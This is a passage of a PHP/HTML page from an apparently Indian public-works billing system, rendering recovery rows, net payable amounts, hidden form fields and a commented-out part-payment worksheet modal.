echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non Deployment of Technical manpower (as per clause 36(i)) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$non_dep_man_power_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non-Submission of QA related document : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".number_format($nonsubmission_qa, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";


if($sd_amt != 0)
{
$eb = 1;
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ec_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Security Deposit @ 5% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($sd_amt, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}

// This row is for Recovery Release
if($rrcount>0)
{
	for($rrc=0; $rrc<$rrcount; $rrc++)
	{
	echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ed_text." (".$ed.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$RRDescCivArr[$rrc]." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".number_format($RRAmtCivArr[$rrc], 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
	$ed++; $ed_text = "";
	}
}

echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
if($total_recovery != 0)
{
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='5'></td><td style='border:none' class='labelprint' align='right' colspan='4'>&nbsp;</td><td colspan='2' align='right' style='border:none; border-bottom:1px dashed #000000' class='labelprint'></td><td style='border:none; border-bottom:1px dashed #000000'>&nbsp;</td></tr>";
}

if($Overall_net_amt_final != 0)
{
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='5'><b>Net Payable Amount :</b> <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='6'><b>".number_format($Overall_net_amt_final, 2, '.', '')."</b></td><td style='border:none'>&nbsp;</td></tr>";
}*/

//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
//$Overall_net_amt_final = "18767031.35";
/*$split_amt = explode(".",$Overall_net_amt_final);
$rupees_part = $split_amt[0];
$paise_part = $split_amt[1];
$rupee_part_word = number_to_words($rupees_part);

if($paise_part != 0)
{
	$paise_part_word = " and Paise ".number_to_words($paise_part)."";
}
$amount_in_words = $rupee_part_word.$paise_part_word;
echo "<tr style='border:none'><td style='border:none'>&nbsp;</td><td style='border:none'>&nbsp;</td><td style='border:none' class='labelprint' align='left' colspan='12'>Amount: (Rupees ".$amount_in_words.")</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>page ".$page."</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";*/
?>
<?php 

//echo "<p  style='page-break-after:always;'></p>";
/*for($x=0;$x<$emptypage;$x++)
{
$page++;
echo $title;
echo $table;
echo "<table width='1087px' bgcolor='white'   border='0' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
$y=1;
while($y<22)
{
?>
	<tr>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='20%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='8%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='4%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
</tr>
	<?php
	$y++;		
}
echo "<tr class='labelprint'><td colspan='12' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;border-top:2px solid #cacaca;' align='center'> </td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";
//$page++;
}*/
?>
<input type="hidden" name="txt_abstmbno" id="txt_abstmbno" value="<?php echo $abstmbno; ?>" />
<input type="hidden" name="txt_maxpage" id="txt_maxpage" value="<?php echo $page; ?>" />
<input type="hidden" name="txt_abstractstr" id="txt_abstractstr" value="<?php echo $AbstractStr; ?>" />
<input type="hidden" name="txt_subdivid_slmstr" id="txt_subdivid_slmstr" value="<?php echo $SubdividSlmStr; ?>" />
<input type="hidden" name="txt_rbn_no" id="txt_rbn_no" value="<?php echo $runn_acc_bill_no; ?>" />

<input type="hidden" name="table_group_count" id="table_group_count" value="<?php echo $table_group_row; ?>" />
<input type="hidden" name="txt_sheet_id" id="txt_sheet_id" value="<?php echo $abstsheetid; ?>" />
<!--<div align="center" class="btn_outside_sect printbutton">
	<div class="btn_inside_sect">
		<input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> 
	</div>
	<div class="btn_inside_sect">
		<input type="Submit" name="Submit" value="Confirm" id="Submit" /> 
	</div>
	<div class="btn_inside_sect">
		<input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" />
	</div>
</div> -->

		<div style="text-align:center; height:45px; line-height:45px;" class="printbutton">
			<div class="buttonsection">
			<input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> 
			</div>
			<!--<div class="buttonsection">
			<input type="Submit" name="Submit" value="Confirm" id="Submit" /> 
			</div>-->
			<div class="buttonsection">
			<input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" />
			</div>
		</div>

		<!-- modal content -->
		<!--<div id="basic-modal-content">
			<div align="center" class="popuptitle">Part Payment Work Sheet</div>
			<div align="center" style="padding-top:10px;">
			<table class="label table2" width="100%" cellpadding="3" cellspacing="3" id="table2">
				<tr bgcolor="">
					<td width="60px" align="left">Item No.</td>
					<td width="">
						<input type="text" readonly="" name="txt_item_no" id="txt_item_no" size="8" class="popuptextbox" />
						<input type="hidden" name="txt_item_id" id="txt_item_id" size="8" class="popuptextbox" />
					</td>
					<td width="60px" align="center">RAB No.</td>
					<td width="">
						<input type="text" name="txt_rab_no" id="txt_rab_no" size="6" class="popuptextbox" value="<?php echo $rbn; ?>" />
					</td>
					<td  align="left" colspan="4">Measurement Date - From &nbsp; :
						<input type="text" name="txt_from_date" id="txt_from_date" size="12" class="popuptextbox" value="<?php echo dt_display($fromdate); ?>" />
					To :
						<input type="text" name="txt_to_date" id="txt_to_date" size="12" class="popuptextbox" value="<?php echo dt_display($todate); ?>" />
					</td>
				</tr>
				<tr bgcolor="">
				<td width="135px" align="left">Item Description</td>
					<td width="700px" align="left" colspan="7">
						<textarea name="txt_item_desc" id="txt_item_desc" class="popuptextbox" rows="2" style="text-align:left; width:820px; height:34px;"></textarea>
					</td>
				</tr>

			</table>
			</div>
			<div style="padding-top:10px; height:325px;">
				<div style="float:left; width:567px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="94%" id="table3">
					<tr bgcolor="#0080ff" style="color:#FFFFFF">
						<td align="center" colspan="7">Deduct Previous Measurement</td>
					</tr>
					<tr>
						<td align="left" colspan="7" bgcolor="#f2efef">
						Deduct Previous Measurement Total Quantity&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;
						<input type="text" name="txt_dpm_qty" id="txt_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						</td>
					</tr>
					<tr>
						<td width="10px" rowspan="2" align="center">RBN.</td>
						<td width="61px" rowspan="2" align="center">Item Qty.</td>
						<td width="63px" rowspan="2" align="center">Rate&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Paid Details</td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Payable Details</td>
					</tr>
					<tr>
						<td width="23px" align="center">(%)</td>
						<td width="110px" align="center">Amount&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td width="23px" align="center">(%)</td>
						<td style='width:110px' align="center">Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
					</tr>
					<tr>
						<td colspan="4" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
						<td align="left"><input type="text" name="txt_partpay_total_paidamt_dpm" id="txt_partpay_total_paidamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
						<td colspan=""></td>
						<td colspan=""><input type="text" name="txt_partpay_total_payableamt_dpm" id="txt_partpay_total_payableamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
					</tr>
					<tr>
						<td colspan="7">Remarks:<br/><textarea name="txt_dpm_remarks" id="txt_dpm_remarks" rows="3" style="width:519px;"></textarea>
						</td>
					</tr>
				</table>
				</div>
				<div style="float:right;  width:427px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="93%" id="table4">
						<tr bgcolor="#0080ff" style="color:#FFFFFF">
							<td align="center" colspan="5">Since Last Measurement</td>
						</tr>
						<tr>
							<td align="left" colspan="5" bgcolor="#f2efef">
							Since Last Measurement Quantity&nbsp;:&nbsp;
							<input type="text" name="txt_slm_qty" id="txt_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							<input type="hidden" name="hid_slm_qty" id="hid_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							</td>
						</tr>
						<tr>
							<td width="61px" align="center">Item Qty.</td>
							<td width="63px" align="center">Rate&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="23px" align="center">(%)</td>
							<td width="50px" align="center">Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id='rowid0'>
							<td width="61px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_qty_slm[]" id="txt_partpay_qty_slm0" class="dynamictextbox" style="text-align:right; width:93px; border: 1px solid #2aade4;" onblur="ValidateSlm(); calculateAmount(this,0,'qty','slm');" />
							</td>
							<td width="63px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_item_rate_slm" readonly="" id="txt_item_rate_slm0" class="dynamictextbox" style="text-align:right; width:80px;" onblur="calculateAmount(this,0,'rate','slm');" />
							</td>
							<td width="23px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_percent_slm" id="txt_partpay_percent_slm0" class="dynamictextbox" style="text-align:right; width:40px; border: 1px solid #2aade4;" onblur="ValidatePercent(this,'slm',0); calculateAmount(this,0,'percent','slm');" />
							</td>
							<td width="50px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_amt_slm[]" id="txt_partpay_amt_slm0" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center" class="dynamicrowcell" style="text-align:center;">
							<input type="button" name="btn_add_row_slm" id="btn_add_row_slm" class="editbtnstyle" value=" + " style="width:32px; text-align:center; font-weight:bold; border-radius: 0px;" onclick="addRow();" />
							<input type="hidden" name="hid_slm_result[]" id="hid_slm_result0" class="dynamictextbox" />
							</td>
						</tr>
						<tr>
							<td width="147px" colspan="3" align="right">Total Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
							<td width="50px" align="right"  class="dynamicrowcell">
							<input type="text" name="txt_partpay_total_amt_slm" id="txt_partpay_total_amt_slm" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr>
							<td colspan="5">Remarks:<br/><textarea name="txt_slm_remarks" id="txt_slm_remarks" rows="3" style="width:375px;"></textarea>
							</td>
						</tr>
					</table>
				</div>
			</div>
			<div align="right">
				<table width="100%" height="65" class="label" cellpadding="3" cellspacing="3">
					<tr>
					<td align="right" width="440px">
					<label style="background:#EAEAEA; padding:6px;">Over All Total Amount</label>&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;
					<input type="text" name="txt_overall_total" id="txt_overall_total" size="20" class="dynamictextbox dynamictextbox2" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</td>
					</tr>
				</table>
			</div>
			<div class="bottomsection" align="center">
				<div class="buttonsection" align="center"><input type="button" name="btn_save" id="btn_save" value=" Save " class="buttonstyle" onclick="SaveData()" /></div>
				<div class="buttonsection" align="center"><input type="button" name="btn_cancel" id="btn_cancel" value=" Cancel " class="buttonstyle" onclick="CancelData()" /></div>
			</div>
		</div>
		
		<!-- preload the images -->
		<!--<div style='display:none'>
			<img src='img/basic/x.png' alt='' />
		</div>     -->
</form>
</body>

</html>